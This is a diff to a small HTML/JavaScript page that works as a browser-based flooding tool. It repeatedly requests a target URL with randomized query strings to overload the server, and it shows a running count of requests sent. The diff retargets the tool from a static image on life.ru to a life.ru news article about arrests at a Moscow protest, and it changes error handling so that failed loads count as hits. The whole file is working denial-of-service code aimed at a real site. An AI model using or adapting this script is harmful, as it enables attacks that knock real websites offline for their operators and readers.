@@ -26,7 +26,7 @@ button{
 <body>
 <center>
 <div style="margin: 0;position: absolute;top: 50%;left: 50%;margin-right: -50%;transform: translate(-50%, -50%);">
-<h1 id="target">Текущая цель: static.live.ru</h1>
+<h1 id="target">Текущая цель: live.ru</h1>
 <br><br>
 <button id="start">Start</button>
 <br><br>
@@ -39,7 +39,7 @@ button{
 </center>
 <script>
 var isRunning  = false;
-target = 'https://static.life.ru/posts/2017/03/989643/gr/north/4e27eac6a867c4b23f0bd4485ef98e05__1440x.jpg';
+target = 'https://life.ru/t/%D0%BD%D0%BE%D0%B2%D0%BE%D1%81%D1%82%D0%B8/990090/okolo_500_chieloviek_zadierzhany_v_moskvie_na_niesoghlasovannom_mitinghie';
 startBtn = document.getElementById("start");
 targetElement = document.getElementById("target");
 rSent = document.getElementById("rSent");
@@ -68,9 +68,8 @@ function onSucceed(){
 }
 function sendRequest(){
 	var img = new Image();
-	img.onerror = function() {onAbort();};
+	img.onerror = function() {onSucceed();};
 	img.onabort = function() {onAbort();};
-	img.onload = function() {onSucceed();};
 	img.setAttribute("src", target + "?" + randomT() + "=" + Math.floor(Math.random()*2147483647));
 	sent++;
 	rSent.innerHTML = "Всего запросов: " + sent;
